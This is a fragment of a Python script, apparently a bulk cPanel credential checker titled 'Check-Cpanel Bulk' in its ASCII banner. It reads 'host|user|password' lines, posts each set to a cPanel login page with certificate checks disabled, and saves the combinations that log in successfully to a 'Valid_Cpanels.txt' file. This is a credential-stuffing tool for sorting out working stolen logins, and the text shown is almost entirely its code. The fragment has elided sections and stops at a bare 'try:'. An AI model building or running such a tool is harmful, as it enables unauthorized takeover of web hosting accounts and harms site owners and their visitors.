...
def cpanel(host, user, pswd):
    try:
        ...
        text = s.post("https://"+host+"/login", data=data, verify=False, allow_redirects=False, timeout=1).text
        if "URL=/cpses" in text:
            print(f"{fc}[{gr}VALID CPANEL{fc}] | HIDE RESULT")
            fopen = open("Valid_Cpanels.txt","a")
            fopen.write("https://"+host+"|"+user+"|"+pswd+"\n")
            fopen.close()
        else:
            print(f"{fc}[{red}Failed LOGIN{fc}] {res}{host}{red}|{res}{user}{red}|{res}{pswd}")
        s.close()
    except KeyboardInterrupt:
        print("Closed")
        exit()
    except:
        print(f"{fc}[{bl}Conection Timeout{fc}] {res}{host}{yl}|{res}{user}{yl}|{res}{pswd}")
def cpa(url):
    try:
        prepare = url.split("|")
        if "://" in prepare[0]:
...
def printez():
    print(f'''
{gr}
_________  .__                    __             _________                                .__    __________      .__    __    
\_   ___ \ |  |__   ____   ____  |  | __         \_   ___ \ ______ _____     ____   ____  |  |   \______   \__ __|  |  |  | __
/    \  \/ |  |  \_/ __ \_/ ___\ |  |/ /  ______ /    \  \/ \____ \\__  \   /    \_/ __ \ |  |    |    |  _/  |  \  |  |  |/ /
\     \____|   Y  \  ___/\  \___ |    <  /_____/ \     \____|  |_> >/ __ \_|   |  \  ___/ |  |__  |    |   \  |  /  |__|    < 
 \______  /|___|  /\___  >\___  >|__|_ \          \______  /|   __/(____  /|___|  /\___  >|____/  |______  /____/|____/|__|_ \
        \/      \/     \/     \/      \/                 \/ |__|        \/      \/     \/                \/                 \/''')
printez()
try:
